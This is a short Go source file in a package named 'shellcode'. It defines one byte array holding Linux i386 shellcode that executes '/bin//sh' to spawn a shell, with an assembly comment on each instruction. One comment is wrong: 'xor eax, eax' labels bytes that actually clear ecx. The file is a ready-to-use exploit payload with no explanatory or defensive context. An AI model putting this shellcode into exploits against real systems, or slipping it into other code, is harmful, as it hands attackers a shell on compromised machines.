package shellcode

var I386ExecveShell = []byte{
	0x31, 0xc9, // xor eax, eax
	0xf7, 0xe1, // mul ecx
	0x51,                         // push ecx
	0x68, 0x2f, 0x2f, 0x73, 0x68, // push '//sh'
	0x68, 0x2f, 0x62, 0x69, 0x6e, // push '/bin'
	0x89, 0xe3, // mov ebx, esp
	0xb0, 0x0b, // mov al, 0xb
	0xcd, 0x80, // int 0x80
}